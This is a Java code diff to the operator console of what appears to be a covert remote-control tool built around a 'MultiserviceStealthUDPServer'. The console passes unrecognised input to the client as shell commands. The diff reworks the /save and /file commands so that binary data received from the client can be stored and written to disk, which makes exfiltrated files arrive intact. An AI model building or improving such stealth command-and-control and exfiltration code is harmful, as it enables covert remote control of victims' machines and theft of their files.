@@ -12,11 +12,11 @@ import networking.MultiserviceStealthUDPServer;
 public class LocalCommandInterpreter{
 	Scanner in;
 	ArrayList<String> commands;
-	ArrayList<String> storedMessages;
+	ArrayList<ArrayList<Byte>> storedMessages;
 	public LocalCommandInterpreter(){
 		in=new Scanner(System.in);
 		commands=new ArrayList<String>();
-		storedMessages = new ArrayList<String>();
+		storedMessages = new ArrayList<ArrayList<Byte>>();
 		commands.add("/help");
 		commands.add("/clear: Clears current UDP buffer");
 		commands.add("/save: Saves current UDP buffer");
@@ -38,18 +38,18 @@ public class LocalCommandInterpreter{
 			}
 			System.out.println("Anything not on the list above will be sent to the client as a shell command");
 		}else if(command.startsWith("/clear")) {
-			MultiserviceStealthUDPServer.totalRecieved="";
+			MultiserviceStealthUDPServer.clearTotalRecieved();
 		}else if(command.startsWith("/save")) {
-			storedMessages.add(MultiserviceStealthUDPServer.totalRecieved);
+			ArrayList<Byte> file = new ArrayList<Byte>();
+			for(Byte b:MultiserviceStealthUDPServer.totalRecieved){
+				file.add(b);
+			}
+			storedMessages.add(file);
 		}else if(command.startsWith("/read")) {
 			System.out.println(MultiserviceStealthUDPServer.totalRecieved);
 		}else if(command.startsWith("/history")) {
 			for(int i =0; i<storedMessages.size(); i++) {
-				System.out.print("["+i+"] "+storedMessages.get(i).substring(0, Math.min(storedMessages.get(i).length(), 30)));
-				if(storedMessages.get(i).length()>30){
-					System.out.print("...");
-				}
-				System.out.println("");
+				System.out.println("["+i+"] "+storedMessages.get(i).toString().substring(0,Math.min(storedMessages.get(i).toString().length(), 30)));
 			}
 		}else if(command.startsWith("/file")){
 			System.out.println("[+] Starting File Save");
@@ -60,10 +60,31 @@ public class LocalCommandInterpreter{
 				File file = new File(fileName);
 				System.out.println("[+] Saving File "+entryNumber+" to ./"+fileName);
 				FileOutputStream fileWriter = new FileOutputStream(file);
-				fileWriter.write(storedMessages.get(entryNumber).getBytes());
+				System.out.println("[+] File Size: "+storedMessages.get(entryNumber).size());
+				long iterator=0;
+				for(Byte b:storedMessages.get(entryNumber)){
+					iterator++;
+				}
+				System.out.println("[+] Longs File Size: "+iterator);
+				byte[] fileBytes = new byte[storedMessages.get(entryNumber).size()];
+				System.out.println("[!] File Bytes Size "+fileBytes.length);
+				for(int i = 0; i < storedMessages.get(entryNumber).size(); i++){
+					ArrayList<Byte> selectedFile = storedMessages.get(entryNumber);
+					Byte b = selectedFile.get(i);
+					try{
+						fileBytes[i]=b.byteValue();
+					}catch(NullPointerException e){
+						System.out.println(e.toString());
+						System.out.println(i+"	:	"+b);
+						fileBytes[i]=0x00;
+					}
+					
+				}
+				fileWriter.write(fileBytes);
 				fileWriter.close();
 				System.out.println("[+] File Write Complete.");
 			}catch(Exception e){
+				e.printStackTrace();
 				System.out.println("Error: Proper Syntax:");
 				System.out.println("\n/file <index> <filename>");
 			}
